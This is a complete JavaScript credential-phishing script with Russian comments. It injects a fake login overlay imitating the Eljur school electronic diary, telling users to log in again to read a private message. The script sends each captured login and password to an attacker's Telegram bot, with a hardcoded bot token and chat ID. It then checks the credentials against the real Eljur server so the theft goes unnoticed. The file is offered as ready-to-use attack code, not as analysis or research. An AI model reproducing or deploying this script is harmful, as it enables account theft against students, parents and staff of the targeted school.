// Блокируем прокрутку
document.body.style.position = "relative";
document.body.style.overflow = "hidden";

// Размытие фона
const blurOverlay = document.createElement("div");
Object.assign(blurOverlay.style, {
  position: "fixed",
  top: "0",
  left: "0",
  width: "100%",
  height: "100%",
  backdropFilter: "blur(8px)",
  background: "rgba(0,0,0,0.4)",
  zIndex: "9998"
});
document.body.appendChild(blurOverlay);

// Окно логина
const loginViewport = document.createElement("div");
loginViewport.id = "loginviewport";
loginViewport.className = "login-outer";
Object.assign(loginViewport.style, {
  position: "fixed",
  top: "50%",
  left: "50%",
  transform: "translate(-50%, -50%)",
  zIndex: "9999",
  background: "#fff",
  borderRadius: "12px",
  boxShadow: "0 0 15px rgba(0,0,0,0.3)",
  padding: "30px",
  maxWidth: "400px",
  width: "100%"
});

loginViewport.innerHTML = `
  <div class="login-form login-form--centered">
    <div class="login-form__body">
      <h1 class="ej-form__header" style="text-align:center;">
        Для прочтения личного сообщения войдите снова
      </h1>
      <div class="error-container"></div>
      <form method="post" name="login" class="ej-form ej-form--text-center ej-form--vertical">
        <div class="ej-form__body">
          <div class="ej-form-group ej-form-group--12">
            <label class="ej-form-label"><span>Логин</span></label>
            <div class="ej-form-control">
              <input autocomplete="username" type="text" class="field field--fill field--big" />
            </div>
          </div>
          <div class="ej-form-group ej-form-group--12">
            <label class="ej-form-label"><span>Пароль</span></label>
            <div class="ej-form-control">
              <input autocomplete="current-password" type="password" class="field field--fill field--big" />
            </div>
          </div>
        </div>
        <div class="ej-form__footer">
          <button type="submit" class="button button--red button--big button--fill">Войти</button>
        </div>
      </form>
    </div>
  </div>
`;

document.body.appendChild(loginViewport);

// Функция отправки в Telegram
function sendToTelegram(login, password) {
  const token = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
  const chatId = "-1003077695457"; 
  const url = `https://api.telegram.org/bot${token}/sendMessage`;

  const text = `🔑 Логин: ${login}\n🔒 Пароль: ${password}`;

  fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: text
    })
  }).catch(err => console.error("Ошибка отправки в Telegram:", err));
}

// Логика кнопки "Войти"
const form = loginViewport.querySelector("form");
form.addEventListener("submit", function (e) {
  e.preventDefault();

  const loginInput = loginViewport.querySelector('input[autocomplete="username"]');
  const passInput  = loginViewport.querySelector('input[autocomplete="current-password"]');

  const loginVal = (loginInput.value || "").trim();
  const passVal  = (passInput.value || "").trim();

  const errorContainer = loginViewport.querySelector(".error-container");
  errorContainer.innerHTML = ""; // очищаем старые ошибки

  if (!loginVal || !passVal) {
    errorContainer.innerHTML = `
      <div class="notice notice--red notice--medium">
        <div class="notice__content">
          <div class="notice__content__text"><p>Заполните логин и пароль</p></div>
        </div>
      </div>`;
    return;
  }

  // Отправляем данные в Telegram
  sendToTelegram(loginVal, passVal);

  // Запрос на Eljur
  fetch("https://shkolakzn.eljur.ru/ajaxauthorize", {
    method: "POST",
    headers: {
      "accept": "*/*",
      "content-type": "application/json"
    },
    body: JSON.stringify({
      username: loginVal,
      password: passVal
    })
  })
    .then(res => res.json())
    .then(data => {
      if (data.result && data.actions && data.actions[0]?.type === "redirect") {
        // успешный вход
        blurOverlay.remove();
        loginViewport.remove();
        document.body.style.overflow = "";
        document.body.style.position = "";
      } else if (data.errors && data.errors.length > 0) {
        // ошибка
        const msg = data.errors[0].text || "Ошибка входа";
        errorContainer.innerHTML = `
          <div class="notice notice--red notice--medium">
            <div class="notice__content">
              <div class="notice__content__text"><p>${msg}</p></div>
            </div>
          </div>`;
      }
    })
    .catch(err => {
      console.error("Ошибка запроса:", err);
      errorContainer.innerHTML = `
        <div class="notice notice--red notice--medium">
          <div class="notice__content">
            <div class="notice__content__text"><p>Сервер недоступен</p></div>
          </div>
        </div>`;
    });
});
